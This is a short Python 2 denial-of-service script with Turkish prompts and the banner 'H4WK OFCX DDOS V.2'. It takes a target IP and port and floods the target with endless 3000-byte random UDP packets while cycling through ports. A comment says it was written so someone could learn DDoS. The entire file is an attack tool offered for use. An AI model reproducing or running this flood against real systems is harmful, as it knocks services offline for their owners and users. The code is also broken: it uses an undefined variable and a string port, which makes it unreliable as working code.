import sys
import os 
import time 
import socket
import random 
from datetime import datetime
author2 = "fenrir scripti çalsana :D"
author3 = "bu script fenrir kolpası için ddosu öğrenmesi için yazıldı"
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3000)
os.system("clear")
banner = """
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
         
     H4WK OFCX DDOS V.2

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"""
print(banner)
ip = raw_input("Hedef İp => ")
port = raw_input("Hedef Port => ")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = porti + 1
     print "Gönderilen %s Paket  %s Bağlantı noktası:%s"%(sent,ip,port)
     if port == 65534:
        port = 1
